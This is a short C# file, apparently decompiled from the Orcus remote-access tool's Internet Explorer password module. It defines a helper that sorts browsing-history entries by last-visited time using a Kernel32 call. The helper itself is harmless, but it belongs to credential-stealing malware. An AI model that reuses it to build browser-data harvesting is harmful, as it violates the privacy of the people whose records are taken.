using System.Collections;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;

namespace Orcus.Commands.Passwords.Applications.InternetExplorer.Native;

public class SortFileTimeAscendingHelper : IComparer
{
	int IComparer.Compare(object a, object b)
	{
		STATURL sTATURL = (STATURL)a;
		STATURL sTATURL2 = (STATURL)b;
		return CompareFileTime(ref sTATURL.ftLastVisited, ref sTATURL2.ftLastVisited);
	}

	[DllImport("Kernel32.dll")]
	private static extern int CompareFileTime([In] ref FILETIME lpFileTime1, [In] ref FILETIME lpFileTime2);

	public static IComparer SortFileTimeAscending()
	{
		return new SortFileTimeAscendingHelper();
	}
}
